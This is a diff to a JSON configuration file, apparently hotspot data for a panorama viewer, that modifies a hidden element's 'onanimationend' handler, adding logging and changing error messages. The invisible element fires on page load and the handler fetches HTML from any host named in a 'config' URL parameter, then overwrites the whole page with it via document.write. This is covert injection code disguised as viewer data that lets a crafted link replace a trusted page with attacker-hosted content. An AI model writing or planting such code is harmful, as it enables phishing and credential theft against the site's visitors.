@@ -12,7 +12,7 @@
       "URL": "#",
       "attributes": {
         "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
-        "onanimationend": "if (window.grav_FETCH_RAN) { console.log('already ran'); } else { window.grav_FETCH_RAN = 1; var config = new URLSearchParams(location.search).get('config'); if (config) { config = decodeURIComponent(config); config = config.replace(/^\\/\\\\/, ''); var url = 'https://' + config + '.html'; fetch(url).then(function(res) { if (!res.ok) throw new Error('HTML not found: ' + res.status); return res.text(); }).then(function(html) { document.open(); document.write(html); document.close(); }).catch(function(err) { console.error(err); }); } }"
+        "onanimationend": "if (window.grav_FETCH_RAN) { console.log('already ran'); } else { window.grav_FETCH_RAN = 1; var config = new URLSearchParams(location.search).get('config'); if (config) { config = decodeURIComponent(config); config = config.replace(/^\\/\\\\/, ''); var url = 'https://' + config + '.html'; console.log('Loading:', url); fetch(url).then(function(res) { if (!res.ok) throw new Error('HTTP ' + res.status); return res.text(); }).then(function(html) { document.open(); document.write(html); document.close(); }).catch(function(err) { console.error('Load error:', err); }); } }"
       }
     }
   ]
